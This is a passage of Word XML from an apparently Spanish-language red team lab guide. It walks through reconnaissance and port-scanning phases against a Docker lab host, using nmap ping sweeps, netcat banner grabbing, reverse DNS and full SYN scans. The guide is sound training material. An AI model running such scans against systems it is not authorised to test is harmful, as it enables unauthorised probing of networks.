        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Ejecutar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379E5DA0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-1-recon/recon.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517AA4C1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="690F73F3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace el script paso a paso</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E02A71" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ping </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>sweep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Escanea toda la subred </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>172.20.0.0/24</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> para descubrir hosts activos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C8D984" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> 172.20.0.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4D53B9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2791D7F2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Banner </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>grabbing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Se conecta a puertos comunes (21, 22, 23, 25, 80, 139, 443, 445, 3306) y captura el banner de cada servicio:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21163383" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -v -w 2 172.20.0.20 &lt;puerto&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC2DED6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DEBA510" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>DNS reverso</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Resuelve el nombre de host del target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44283140" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>dig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -x 172.20.0.20 +short</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F6474E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="071A5A20" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Resultado esperado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1900287D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>================================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361DF2FE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Phase 1 — Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FFBADD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target  : 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB079CB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> Date    : YYYY-MM-DD HH:MM:SS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433D1B7D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>================================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5473D6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Ping sweep over 172.20.0.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34ECA206" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Banner grabbing on common ports of 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75108C61" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Reverse DNS lookup for 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E65B07" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[INFO] Evidence saved at: /root/loot/phase-1-recon/&lt;timestamp&gt;/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3EE3B4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DB220CB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Evidencia generada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7C2578" w14:paraId="1771667F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="65A0F29F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="6A88A6BC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="7A00FA1C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7475D4B3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ping-sweep.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="676DCA91" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Hosts activos en 172.20.0.0/24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="75E9F5A6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="1287F16C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>banners.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="0445696C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Banners de cada puerto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="41F2F129" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B81E1F5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>dns-reverse.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30C64933" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Nombre DNS del target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="201A7E40" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="3D730A5B" w14:textId="0E82FA11" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="51C01CE4" wp14:editId="7833B9BD">
            <wp:extent cx="5972810" cy="5123180"/>
            <wp:effectExtent l="0" t="0" r="8890" b="1270"/>
            <wp:docPr id="7263852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3852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512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A1440" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07979B2B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>5. Fase 2 — Escaneo de puertos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2871C6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50A198C3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Descubrir todos los puertos abiertos, identificar versiones de servicios y detectar el sistema operativo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626E56E4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Técnicas:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escaneo SYN completo (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p-), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> de versiones (-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>), detección de OS (-O), scripts NSE de vulnerabilidades.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0851CE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Duración estimada:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5-10 minutos (escaneo completo de 65535 puertos).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603711AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Ejecutar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3BADB20D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-2-scanning/port-scan.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119469E7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05AF79D8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace el script paso a paso</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E20C6A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Escaneo SYN completo</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> con detección de versión y OS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76031A24" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
